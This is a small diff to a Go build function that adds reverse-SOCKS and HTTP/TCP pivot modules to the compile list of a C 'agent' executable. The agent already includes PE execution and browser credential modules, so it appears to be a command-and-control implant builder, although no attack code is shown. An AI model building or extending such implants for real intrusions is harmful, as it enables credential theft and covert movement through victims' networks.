@@ -571,6 +571,9 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		filepath.Join(agentDir, "pe_exec.c"),
 		filepath.Join(agentDir, "dotnet.c"),
 		filepath.Join(agentDir, "browsercreds.c"),
+		filepath.Join(agentDir, "rsocks.c"),
+		filepath.Join(agentDir, "http_pivot.c"),
+		filepath.Join(agentDir, "tcp_pivot.c"),
 		filepath.Join(agentDir, "sqlite3.o"),
 	}
 
